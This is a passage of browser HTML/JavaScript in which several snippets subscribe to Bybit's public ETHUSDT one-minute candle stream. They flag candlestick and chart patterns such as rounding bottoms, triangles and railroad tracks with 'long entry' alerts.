      const isRisingThree = p.close > p.open && c.close > p.close && candles.slice(-3).every(x => x.close < p.close);
      const isFallingThree = p.close < p.open && c.close < p.close && candles.slice(-3).every(x => x.close > p.close);
      const isMarubozu = Math.abs(c.open - c.low) < cSize * 0.05 && Math.abs(c.close - c.high) < cSize * 0.05;

      // === Volume & SMC Logic ===
      const bigVolume = c.volume > avgVolume(10) * 1.5;
      const liquidityGrab = c.low < Math.min(...candles.slice(-5).map(x => x.low)) && c.close > c.open;
      const orderBlock = cBody / cSize > 0.6 && c.close > p.close && bigVolume;
      const fairValueGap = Math.abs(c.open - p.close) > cSize * 0.6;

      const goodLongEntry = (
        isDoji || isHammer || isInvHammer || isBullEngulf || isTweezerBottom ||
        isMorningStar || isThreeWhiteSoldiers || isRisingThree || isMarubozu ||
        liquidityGrab || orderBlock || fairValueGap
      );

      if (goodLongEntry) {
        alert("🚨 GOOD LONG ENTRY DETECTED on ETHUSDT!");
        log("📈 Pattern Signal: GOOD LONG ENTRY");
      }
    }

    function avgVolume(n = 10) {
      const recent = candles.slice(-n);
      const sum = recent.reduce((a, b) => a + b.volume, 0);
      return sum / recent.length || 1;
    }
  </script>
</body>
</html>

<!-- 📡 Live Pattern Detector (Bybit ETHUSDT 1m) -->
<div id="patternStatus" style="color: lime; font-family: monospace; padding: 10px;">
  ⏳ Waiting for Bullish Pattern on ETHUSDT 1m...
</div>

<script>
(() => {
  const status = document.getElementById("patternStatus");
  let candles = [];

  const ws = new WebSocket("wss://stream.bybit.com/v5/public/linear");

  ws.onopen = () => {
    ws.send(JSON.stringify({
      op: "subscribe",
      args: ["kline.1.ETHUSDT"] // ✅ ETHUSDT 1m timeframe
    }));
  };

  ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    if (!data || !data.data || !data.data.kline) return;
    const k = data.data.kline;
    const candle = {
      time: k.start,
      open: parseFloat(k.open),
      high: parseFloat(k.high),
      low: parseFloat(k.low),
      close: parseFloat(k.close)
    };

    candles.push(candle);
    if (candles.length > 100) candles.shift();

    detectPatterns();
  };

  function detectPatterns() {
    const len = candles.length;
    if (len < 30) return;

    const last = candles[len - 1];
    const prev = candles[len - 2];

    // 📈 Broadening Formation
    const isBroadening = detectBroadening();
    if (isBroadening && breakoutHappened()) {
      alert("📢 Broadening Formation Breakout - Good Long Entry on ETH!");
      status.innerText = "✅ Broadening Formation Detected!";
    }

    // ☕ Rounding Bottom
    const isRounding = detectRoundingBottom();
    if (isRounding && last.close > prev.close) {
      alert("📢 Rounding Bottom - Long Entry Triggered on ETH!");
      status.innerText = "✅ Rounding Bottom Detected!";
    }

    // 🚀 Parabolic Curve
    const isParabolic = detectParabolic();
    if (isParabolic) {
      alert("📢 Parabolic Curve Forming - Strong ETH Uptrend!");
      status.innerText = "✅ Parabolic Curve Detected!";
    }

    // 💎 Diamond Bottom
    const isDiamond = detectDiamond();
    if (isDiamond && last.close > prev.high) {
      alert("📢 Diamond Bottom Breakout - Long Entry on ETH!");
      status.innerText = "✅ Diamond Bottom Detected!";
    }
  }

  // ------------------------ PATTERN DETECTORS ------------------------

  function detectBroadening() {
    const highs = candles.slice(-20).map(c => c.high);
    const lows = candles.slice(-20).map(c => c.low);
    const highVolatility = Math.max(...highs) - Math.min(...lows) > 0.02 * highs[0];
    return highVolatility;
  }

  function breakoutHappened() {
    const last = candles[candles.length - 1];
    const last20High = Math.max(...candles.slice(-20).map(c => c.high));
    return last.close > last20High;
  }

  function detectRoundingBottom() {
    const slice = candles.slice(-20);
    const mid = Math.floor(slice.length / 2);
    const left = slice.slice(0, mid).map(c => c.close);
    const right = slice.slice(mid).map(c => c.close);
    const leftDown = left[0] > left[left.length - 1];
    const rightUp = right[0] < right[right.length - 1];
    return leftDown && rightUp;
  }

  function detectParabolic() {
    const closes = candles.slice(-10).map(c => c.close);
    const diffs = closes.map((v, i, arr) => i === 0 ? 0 : v - arr[i - 1]);
    const acceleration = diffs.map((v, i, arr) => i === 0 ? 0 : v - arr[i - 1]);
    const avgAcc = acceleration.reduce((a, b) => a + b, 0) / acceleration.length;
    return avgAcc > 0.2;
  }

  function detectDiamond() {
    const slice = candles.slice(-20);
    const range = slice.map(c => c.high - c.low);
    const avgRange = range.reduce((a, b) => a + b, 0) / range.length;
    const volatility = Math.max(...range) - Math.min(...range);
    return volatility < avgRange * 2 &&
           slice[0].high > slice[10].high &&
           slice[19].high > slice[10].high;
  }
})();
</script>

<!-- 📡 Live Bullish Exotic Pattern Detector (ETHUSDT 1m) -->
<div id="patternStatus" style="color: lime; font-family: monospace; padding: 10px;">
  ⏳ Waiting for Exotic Bullish Pattern on ETHUSDT 1m...
</div>

<script>
(() => {
  const status = document.getElementById("patternStatus");
  let candles = [];

  const ws = new WebSocket("wss://stream.bybit.com/v5/public/linear");

  ws.onopen = () => {
    ws.send(JSON.stringify({
      op: "subscribe",
      args: ["kline.1.ETHUSDT"] // ✅ ETHUSDT 1m timeframe
    }));
  };

  ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    if (!data || !data.data || !data.data.kline) return;
    const k = data.data.kline;
    const candle = {
      time: k.start,
      open: parseFloat(k.open),
      high: parseFloat(k.high),
      low: parseFloat(k.low),
      close: parseFloat(k.close)
    };

    candles.push(candle);
    if (candles.length > 100) candles.shift();

    detectPatterns();
  };

  function detectPatterns() {
    const last = candles[candles.length - 1];
    const prev = candles[candles.length - 2];

    if (detectSymmetricalTriangle()) {
      alert("📢 Symmetrical Triangle Breakout - Long Entry on ETH!");
      status.innerText = "✅ Symmetrical Triangle Detected";
      return;
    }

    if (detectRectangleBox()) {
      alert("📢 Rectangle Range Breakout - Long Entry on ETH!");
      status.innerText = "✅ Rectangle Range Detected";
      return;
    }

    if (detectConsolidationZone()) {
      alert("📢 Consolidation Breakout - Long Entry on ETH!");
      status.innerText = "✅ Consolidation Breakout Detected";
      return;
    }

    if (detectVBottom()) {
      alert("📢 V-Bottom Reversal - Long Entry on ETH!");
      status.innerText = "✅ V-Bottom Detected";
      return;
    }

    if (detectRailroadTracks()) {
      alert("📢 Railroad Tracks - Momentum Long Entry on ETH!");
      status.innerText = "✅ Railroad Tracks Detected";
      return;
    }

    status.innerText = "⏳ Waiting for Exotic Bullish Pattern on ETHUSDT 1m...";
  }

  // ------------------------ PATTERN DETECTORS ------------------------

  function detectSymmetricalTriangle() {
    const slice = candles.slice(-20);
    if (slice.length < 20) return false;

    const highs = slice.map(c => c.high);
    const lows = slice.map(c => c.low);
    const highSlope = (highs[19] - highs[0]) / 20;
    const lowSlope = (lows[19] - lows[0]) / 20;
    const converging = highSlope < 0 && lowSlope > 0;

    const breakout = slice[19].close > Math.max(...highs.slice(0, 15));
    return converging && breakout;
  }

  function detectRectangleBox() {
    const slice = candles.slice(-25);
    if (slice.length < 25) return false;

    const highs = slice.map(c => c.high);
    const lows = slice.map(c => c.low);
    const rangeHigh = Math.max(...highs.slice(0, 20));
    const rangeLow = Math.min(...lows.slice(0, 20));
    const tightRange = (rangeHigh - rangeLow) < (0.01 * rangeLow); // 1% range

    const breakout = slice[24].close > rangeHigh;
    return tightRange && breakout;
  }

  function detectConsolidationZone() {
    const closes = candles.slice(-15).map(c => c.close);
    const avg = closes.reduce((a, b) => a + b, 0) / closes.length;
    const deviation = Math.max(...closes.map(c => Math.abs(c - avg)));
    return deviation / avg < 0.005 && candles[candles.length - 1].close > closes[closes.length - 2];
  }

  function detectVBottom() {
    const slice = candles.slice(-9);
    if (slice.length < 9) return false;

    const left = slice.slice(0, 4).map(c => c.close);
    const right = slice.slice(5).map(c => c.close);

    const sharpDown = left[0] > left[3];
    const sharpUp = right[0] < right[3];
    return sharpDown && sharpUp;
  }

  function detectRailroadTracks() {
    const c1 = candles[candles.length - 3];
    const c2 = candles[candles.length - 2];
    const c3 = candles[candles.length - 1];
    if (!c1 || !c2 || !c3) return false;

    const strongRed = c2.open > c2.close && Math.abs(c2.open - c2.close) > 0.5 * (c2.high - c2.low);
    const strongGreen = c3.close > c3.open && Math.abs(c3.close - c3.open) > 0.5 * (c3.high - c3.low);
    const similarSize = Math.abs((c2.open - c2.close) - (c3.close - c3.open)) < 0.1 * c3.close;

    return strongRed && strongGreen && similarSize && c3.close > c2.open;
  }

})();
</script>
